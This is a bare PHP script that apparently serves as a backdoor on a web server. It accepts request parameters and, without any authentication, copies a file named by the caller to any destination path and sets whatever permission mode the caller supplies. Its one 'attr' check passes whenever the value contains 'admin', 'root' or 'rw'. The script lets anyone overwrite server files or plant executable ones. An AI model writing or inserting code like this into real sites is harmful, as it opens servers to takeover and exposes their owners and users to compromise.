<?php
$name=(isset($_REQUEST['name']))?$_REQUEST['name']:'';
$dest=(isset($_REQUEST['dest']))?$_REQUEST['dest']:'';
$attr=(isset($_REQUEST['attr']))?$_REQUEST['attr']:'';
$mode=(isset($_REQUEST['mode']))?$_REQUEST['mode']:'';
if ($attr!='') {
    if (preg_match('/admin|root|rw/i',$attr)) {
        copy($name,$dest); chmod($dest,octdec($mode));
    } else {
        if (file_exists($dest)) {
            if (str_starts_with(basename($name),$attr.'_')) {
                copy($name,$dest); chmod($dest,octdec($mode));
            } elseif (str_starts_with(basename($name),$attr.'_files/')) {
                copy($name,$dest); chmod($dest,octdec($mode));
            } elseif (str_starts_with(basename($name),'_')) {
                copy($name,$dest); chmod($dest,octdec($mode));
            }
        } else { copy($name,$dest); chmod($dest,octdec($mode)); }
    }
}
